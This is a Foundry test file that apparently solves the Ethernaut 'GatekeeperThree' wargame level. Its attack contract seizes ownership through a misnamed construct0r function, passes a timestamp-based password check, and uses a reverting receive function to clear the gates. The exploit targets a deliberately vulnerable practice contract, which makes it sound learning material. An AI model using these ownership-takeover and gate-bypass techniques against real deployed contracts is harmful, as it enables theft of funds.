pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../src/ethernaut/core/Ethernaut.sol";
import "../../src/ethernaut/28-GatekeeperThree/GatekeeperThree.sol";
import "../../src/ethernaut/28-GatekeeperThree/GatekeeperThreeFactory.sol";

contract AttackGatekeeperThree {
    GatekeeperThree keeper;

    constructor(address keeperAddr) {
        keeper = GatekeeperThree(payable(keeperAddr));
    }

    function attack() public payable {
        keeper.construct0r();
        keeper.createTrick();
        keeper.getAllowance(block.timestamp);
        (bool result, ) = payable(keeper).call{value: msg.value}("");
        require(result, "send ether error");
        keeper.enter();
    }

    receive() external payable {
        revert("error");
    }
}

contract GatekeeperThreeTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        
    }

    function testAttck() public {
        vm.startPrank(tx.origin);
        //setup
        ethernaut = new Ethernaut();
        GatekeeperThreeFactory factory = new GatekeeperThreeFactory();
        ethernaut.registerLevel(factory);
        address levelAddress = ethernaut.createLevelInstance(factory);

        GatekeeperThree keeper = GatekeeperThree(payable(levelAddress));
        AttackGatekeeperThree attack = new AttackGatekeeperThree(levelAddress);
        attack.attack{value: 0.002 ether}();
        console.log("keeper owner", keeper.owner());
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        assert(levelSuccessfullyPassed);
    }
}
